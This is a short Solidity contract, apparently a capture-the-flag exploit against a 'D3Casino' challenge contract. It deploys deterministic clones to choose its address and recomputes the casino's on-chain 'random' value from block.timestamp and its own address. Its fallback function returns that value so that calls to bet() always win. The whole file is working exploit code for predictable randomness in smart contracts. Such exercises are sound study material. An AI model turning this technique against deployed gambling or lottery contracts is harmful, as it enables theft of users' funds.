// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;
import "./D3Casino.sol";
import "@openzeppelin/contracts/proxy/Clones.sol";
import "hardhat/console.sol";

contract D3CasinoD323Attack {
    uint256 public value;
    address public proxyAddress;

    function predict(bytes32 salt) public view returns(address predictedAddress) {
        predictedAddress = Clones.predictDeterministicAddress(address(this), salt);
    }

    function clone(bytes32 salt) public {
        proxyAddress = Clones.cloneDeterministic(address(this), salt);
    }


    function bet(address target) public {
        uint256 rand = uint256(
        keccak256(
                abi.encodePacked(block.timestamp, /*block.difficulty,*/ this)
            )
        ) % 17;
        value = rand;
        D3CasinoD323 casino = D3CasinoD323(target);
        casino.bet();
    }

    fallback(bytes calldata /*data*/) external returns(bytes memory retVal) {
        return abi.encode(value);  // low gas
    }
}
